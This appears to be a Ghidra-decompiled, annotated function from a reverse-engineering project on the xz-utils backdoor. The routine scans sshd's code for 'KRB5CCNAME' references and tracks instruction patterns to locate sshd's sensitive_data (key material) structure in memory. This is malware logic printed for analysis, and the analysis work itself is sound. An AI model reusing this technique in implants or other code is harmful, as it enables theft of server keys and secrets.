// /home/kali/xzre-ghidra/xzregh/103340_sshd_find_sensitive_data_base_via_krb5ccname.c
// Function: sshd_find_sensitive_data_base_via_krb5ccname @ 0x103340
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_sensitive_data_base_via_krb5ccname(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, sensitive_data * * sensitive_data_out, elf_info_t * elf)


/*
 * AutoDoc: Starts from the unique `"KRB5CCNAME"` reference, proves that getenv's return value is copied into sshd's `.data/.bss` region with the familiar -0x18 stride, and hands the caller the computed struct base. It tolerates both register-tracking MOV sequences and the LEA/zero-immediate variant OpenSSH uses when the pointer is materialised directly.
 */

#include "xzre_types.h"

BOOL sshd_find_sensitive_data_base_via_krb5ccname
               (u8 *data_start,u8 *data_end,u8 *code_start,u8 *code_end,
               sensitive_data **sensitive_data_out,elf_info_t *elf)

{
  u8 dest_reg;
  BOOL decode_ok;
  u8 *krb5_string_ref;
  u8 *candidate_store;
  uint probe_depth;
  long clear_idx;
  u8 rex_extension;
  sensitive_data *data_cursor;
  u8 *store_scan_cursor;
  dasm_ctx_t *zero_ctx_cursor;
  u8 tracked_reg;
  u8 zero_seed;
  dasm_ctx_t string_scan_ctx;
  dasm_ctx_t store_scan_ctx;
  
  zero_seed = 0;
  // AutoDoc: Clear the primary decoder context before walking the KRB5CCNAME references so the register tracker starts with zeroed state.
  zero_ctx_cursor = &string_scan_ctx;
  for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
    *(u32 *)&zero_ctx_cursor->instruction = 0;
    zero_ctx_cursor = (dasm_ctx_t *)((u8 *)zero_ctx_cursor + 4);
  }
  *sensitive_data_out = (sensitive_data *)0x0;
  // AutoDoc: Use the cached string table to jump straight to the block that references `KRB5CCNAME`.
  krb5_string_ref = elf_find_encoded_string_xref_site(elf,STR_KRB5CCNAME,code_start,code_end);
  if (krb5_string_ref != (u8 *)0x0) {
    while (krb5_string_ref < code_end) {
      decode_ok = x86_decode_instruction(&string_scan_ctx,krb5_string_ref,code_end);
      if (decode_ok == FALSE) {
        krb5_string_ref = krb5_string_ref + 1;
      }
      else {
        if ((string_scan_ctx.opcode_window.opcode_window_dword & 0xfffffffd) == X86_OPCODE_1B_XOR_RM_R) {
          if (string_scan_ctx.prefix.modrm_bytes.modrm_mod == '\x03') {
            if (((string_scan_ctx.prefix.flags_u16 & 0x20) == 0) ||
               ((string_scan_ctx.prefix.modrm_bytes.rex_byte & 8) == 0)) {
              dest_reg = string_scan_ctx.prefix.decoded.flags & DF1_MODRM;
              if ((string_scan_ctx.prefix.flags_u16 & 0x1040) == 0) {
                if ((string_scan_ctx.prefix.flags_u16 & 0x40) != 0) {
                  tracked_reg = 0;
                  dest_reg = string_scan_ctx.prefix.modrm_bytes.modrm_rm;
                  if ((string_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
LAB_00103450:
                    dest_reg = string_scan_ctx.prefix.modrm_bytes.modrm_rm |
                            (string_scan_ctx.prefix.modrm_bytes.rex_byte & 1) << 3;
                  }
                  goto LAB_0010345d;
                }
                tracked_reg = 0;
              }
              else {
                if ((string_scan_ctx.prefix.flags_u16 & 0x40) == 0) {
                  tracked_reg = string_scan_ctx.prefix.decoded.flags2 & DF2_IMM64;
                  if ((string_scan_ctx.prefix.flags_u16 & 0x1000) == 0) goto LAB_0010346b;
                  tracked_reg = string_scan_ctx.mov_imm_reg_index;
                  if ((string_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
                    tracked_reg = string_scan_ctx.mov_imm_reg_index |
                             (string_scan_ctx.prefix.modrm_bytes.rex_byte & 1) << 3;
                  }
                }
                else {
                  tracked_reg = string_scan_ctx.prefix.modrm_bytes.modrm_reg;
                  dest_reg = string_scan_ctx.prefix.modrm_bytes.modrm_rm;
                  if ((string_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
                    tracked_reg = string_scan_ctx.prefix.modrm_bytes.modrm_reg |
                             string_scan_ctx.prefix.modrm_bytes.rex_byte * '\x02' & 8;
                    goto LAB_00103450;
                  }
                }
LAB_0010345d:
                if (dest_reg != tracked_reg) goto LAB_001033d1;
              }
LAB_0010346b:
              // AutoDoc: Reuse the same wipe when scanning the follow-on MOV/LEA window so every `.bss` candidate is decoded with fresh state.
              zero_ctx_cursor = &store_scan_ctx;
              for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
                *(u32 *)&zero_ctx_cursor->instruction = 0;
                zero_ctx_cursor = (dasm_ctx_t *)((u8 *)zero_ctx_cursor + 4);
              }
              // AutoDoc: After spotting the getenv result, walk the next few instructions looking for stores into `.bss`.
              store_scan_cursor = string_scan_ctx.instruction + string_scan_ctx.instruction_size;
              probe_depth = 0;
              while (((store_scan_cursor < code_end && (probe_depth < 6)) &&
                     (decode_ok = x86_decode_instruction(&store_scan_ctx,store_scan_cursor,code_end), decode_ok != FALSE))) {
                if (store_scan_ctx.opcode_window.opcode_window_dword == X86_OPCODE_1B_MOV_STORE) {
                  if (((uint)store_scan_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32) {
                    dest_reg = 0;
                    if ((store_scan_ctx.prefix.flags_u16 & 0x1040) != 0) {
                      if ((store_scan_ctx.prefix.flags_u16 & 0x40) == 0) {
                        dest_reg = store_scan_ctx.prefix.decoded.flags2 & DF2_IMM64;
                        if (((store_scan_ctx.prefix.flags_u16 & 0x1000) != 0) &&
                           (dest_reg = store_scan_ctx.mov_imm_reg_index,
                           (store_scan_ctx.prefix.flags_u16 & 0x20) != 0)) {
                          rex_extension = store_scan_ctx.prefix.modrm_bytes.rex_byte << 3;
                          goto LAB_00103553;
                        }
                      }
                      else {
                        dest_reg = store_scan_ctx.prefix.modrm_bytes.modrm_reg;
                        if ((store_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
                          rex_extension = store_scan_ctx.prefix.modrm_bytes.rex_byte * '\x02';
LAB_00103553:
                          dest_reg = dest_reg | rex_extension & 8;
                        }
                      }
                    }
                    if (dest_reg == tracked_reg) {
                      // AutoDoc: The following RIP-relative add reconstructs the absolute `.bss` pointer that getenv's return register is being stored into.
                      candidate_store = (u8 *)0x0;
                      if ((store_scan_ctx.prefix.flags_u16 & 0x100) != 0) {
                        candidate_store = store_scan_ctx.instruction +
                                 store_scan_ctx.instruction_size + store_scan_ctx.mem_disp;
                      }
                      // AutoDoc: Back up by 0x18 bytes to convert the field pointer into the `sensitive_data` base address.
                      data_cursor = (sensitive_data *)(candidate_store + -0x18);
                      if ((data_start <= data_cursor && candidate_store != (u8 *)0x18) && (candidate_store + 4 <= data_end)
                         ) goto LAB_0010365f;
                    }
                  }
                }
                else if (store_scan_ctx.opcode_window.opcode_window_dword == X86_OPCODE_CET_ENDBR64)
                break;
                store_scan_cursor = store_scan_cursor + store_scan_ctx.instruction_size;
                probe_depth = probe_depth + 1;
              }
            }
          }
        }
        // AutoDoc: Fallback for the LEA/zero-immediate pattern that writes the struct pointer without first capturing getenv's return register.
        else if (string_scan_ctx.opcode_window.opcode_window_dword == X86_OPCODE_1B_MOV_RM_IMM32) {
          if (((((string_scan_ctx.prefix.modrm_bytes.rex_byte & 8) == 0) &&
               ((uint)string_scan_ctx.prefix.decoded.modrm >> 8 == 0x50000)) &&
              ((string_scan_ctx.prefix.flags_u16 & 0x800) != 0)) && (string_scan_ctx.imm_zeroextended == 0)) {
            store_scan_cursor = (u8 *)0x0;
            if ((string_scan_ctx.prefix.flags_u16 & 0x100) != 0) {
              store_scan_cursor = string_scan_ctx.instruction + string_scan_ctx.instruction_size + string_scan_ctx.mem_disp;
            }
            data_cursor = (sensitive_data *)(store_scan_cursor + -0x18);
            if (((store_scan_cursor + 4 <= data_end) && (data_start <= data_cursor)) &&
               (data_cursor != (sensitive_data *)0x0)) {
LAB_0010365f:
              *sensitive_data_out = data_cursor;
              return TRUE;
            }
          }
        }
        else if ((string_scan_ctx.opcode_window.opcode_window_dword == X86_OPCODE_CET_ENDBR64) &&
                (code_start != string_scan_ctx.instruction)) {
          return FALSE;
        }
LAB_001033d1:
        krb5_string_ref = krb5_string_ref + string_scan_ctx.instruction_size;
      }
    }
  }
  return FALSE;
}

